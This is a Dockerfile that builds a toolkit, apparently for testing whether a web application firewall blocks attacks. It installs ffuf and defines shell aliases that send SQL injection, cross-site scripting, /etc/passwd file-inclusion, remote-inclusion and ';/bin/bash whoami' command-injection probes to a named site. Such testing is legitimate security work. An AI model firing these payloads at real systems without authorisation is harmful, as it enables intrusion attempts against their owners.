FROM ubuntu:latest
ENV URL=blog.cocajola.xyz/ \
    FUZZ_COUNT=6000

# Buildtime
RUN set -x; buildDeps='curl dnsutils iputils-ping golang-go git python3 python3-pip' \
    && apt-get update \
    && apt-get install -y $buildDeps \
    && git clone https://github.com/ffuf/ffuf \
    && pip install selenium

WORKDIR /ffuf
COPY ./wordlist.txt .
COPY ./sel.py .
RUN go get \
    && go build \
    # Rate Control
    && tail -$FUZZ_COUNT wordlist.txt > wordlist2.txt \
    && echo 'alias fuzz="./ffuf -w wordlist2.txt -u https://$URL?q=FUZZ -H \"User-Agent: Mozilla/5.0\""' >> ~/.bashrc \
    # WAF
    && echo 'alias wat="curl -D - -s \"https://$URL\" -A \"w3af.sourceforge.net\" -H \"Pragma: Pragma:x-cache,akamai-x-cache-on, akamai-x-get-request-id\" -o /dev/null"' >> ~/.bashrc \
    && echo 'alias protocol="curl -D - -s \"https://$URL\" --data-binary \$\"data=foo%uff1cscript%uff1e\" -H \"Pragma: Pragma:x-cache,akamai-x-cache-on, akamai-x-get-request-id\" -o /dev/null"' >> ~/.bashrc \
    && echo 'alias sqli="curl -D - -s \"https://$URL\" -A \"UNION%20SELECT%20*%20FROM%20user--\" -H \"Pragma: Pragma:x-cache,akamai-x-cache-on, akamai-x-get-request-id\" -o /dev/null"' >> ~/.bashrc \
    && echo 'alias xss="curl -D - -s \"https://$URL\" -A \"%3Cscript%3Ealert()%3C/script%3E\" -H \"Pragma: Pragma:x-cache,akamai-x-cache-on, akamai-x-get-request-id\" -o /dev/null"' >> ~/.bashrc \
    && echo 'alias lfi="curl -D - -s \"https://$URL\" -A \"..\/.\/..\/.\/..\/etc\/passwd\" -H \"Pragma: Pragma:x-cache,akamai-x-cache-on, akamai-x-get-request-id\" -o /dev/null"' >> ~/.bashrc \
    && echo 'alias rfi="curl -D - -s \"https://$URL?q=http:\/\/cirt.net\/rfiinc.txt\" -H \"Pragma: Pragma:x-cache,akamai-x-cache-on, akamai-x-get-request-id\" -o /dev/null"' >> ~/.bashrc \
    && echo 'alias cmdi="curl -D - -s \"https://$URL?q=\;\/bin\/bash%20whoami\" -H \"Pragma: Pragma:x-cache,akamai-x-cache-on, akamai-x-get-request-id\" -o /dev/null"' >> ~/.bashrc \
    && echo 'alias platform="curl -D - -s \"https://$URL\" -H \"Range: 18446744073709551615\" -H \"Pragma: Pragma:x-cache,akamai-x-cache-on, akamai-x-get-request-id\" -o /dev/null"' >> ~/.bashrc \
    && echo 'alias normal="curl -D - -s \"https://$URL\" -A \"astbot/1.0\" -H \"Pragma: Pragma:x-cache,akamai-x-cache-on, akamai-x-get-request-id\" -o /dev/null"' >> ~/.bashrc \
    && echo 'alias waf="wat && protocol && sqli && xss && lfi && rfi && cmdi && platform && normal"' >> ~/.bashrc \
    && echo 'alias swaf="wat | head -n 1 && protocol | head -n 1 && sqli | head -n 1 && xss | head -n 1 && lfi | head -n 1 && rfi | head -n 1 && cmdi | head -n 1 && platform | head -n 1 && normal | head -n 1"' >> ~/.bashrc \
    && echo 'alias sel="python3 sel.py"' >> ~/.bashrc

# Runtime
CMD echo 'Welcome to ast.\nAvailable commands (as alias): sel, fuzz, waf, swaf,\nwat, protocol, sqli, xss, lfi, rfi, cmdi, platform, normal' ; /bin/bash